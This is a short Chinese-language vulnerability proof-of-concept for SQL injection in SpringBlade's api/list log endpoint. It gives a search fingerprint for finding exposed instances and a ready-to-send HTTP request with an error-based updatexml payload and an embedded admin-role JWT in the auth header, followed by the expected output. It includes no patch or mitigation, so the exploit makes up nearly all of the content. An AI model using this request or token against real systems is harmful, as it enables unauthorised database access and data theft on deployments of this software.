# SpringBlade api-list存在SQL注入漏洞

# 一、漏洞简介
SpringBlade api-list存在SQL注入漏洞，攻击者利用该漏洞进行SQL注 入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`

![1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71.png](./img/wySOnzT0xKrb1lCv/1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71-230326.png)

# 四、漏洞复现
```java
GET /api/blade-log/api/list?updatexml(1,concat(0x7e,111*111,0x7e),1)=1 HTTP/1.1
Host: 
Blade-Auth:	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

![1716303401430-b9efceb6-bca4-420d-81f8-f8ecd3220f3c.png](./img/wySOnzT0xKrb1lCv/1716303401430-b9efceb6-bca4-420d-81f8-f8ecd3220f3c-181020.png)

```java
12321
```



> 更新: 2024-12-13 17:10:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bxhqc6lec9obt7lg>